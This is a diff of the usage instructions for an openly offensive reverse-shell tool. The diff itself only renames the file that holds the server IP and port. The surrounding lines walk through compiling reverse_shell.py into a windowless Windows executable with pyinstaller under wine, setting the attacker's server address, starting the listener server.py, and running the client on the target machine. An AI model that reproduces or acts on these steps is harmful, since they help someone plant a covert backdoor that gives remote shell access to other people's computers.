@@ -26,7 +26,7 @@ wine /home/<username>/.wine/drive_c/Python27/python.exe -m pip install pip==18
 wine /home/<username>/.wine/drive_c/Python27/python.exe -m pip install pyinstaller==3.2 
 
 // Compile reverse_shell.py into windows exe programm
-// There is one more file "private_info.py" where you should specify IP of your server machine and port
+// There is one more file "ip_cred.py" where you should specify IP of your server machine and port
 wine /home/<username>/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile --noconsole reverse_shell.py
 
 // exe file is in dist directory
@@ -36,12 +36,12 @@ wine /home/<username>/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile -
 // Make file server.py executable
 chmod +x server.py
 
-// Specify IP and PORT of your server machine in file private_info.py
+// Specify IP and PORT of your server machine in file ip_cred.py
 
 // Run server.py with python (python2 runs well)
 ./server.py
 
-// If you use linux as client, run reverse_shell.py with IP, PORT from private_info.py on linux machine: 
+// If you use linux as client, run reverse_shell.py with IP, PORT from ip_cred.py on linux machine: 
 ./reverse_shell.py 
 
 //If client is Windows machine:
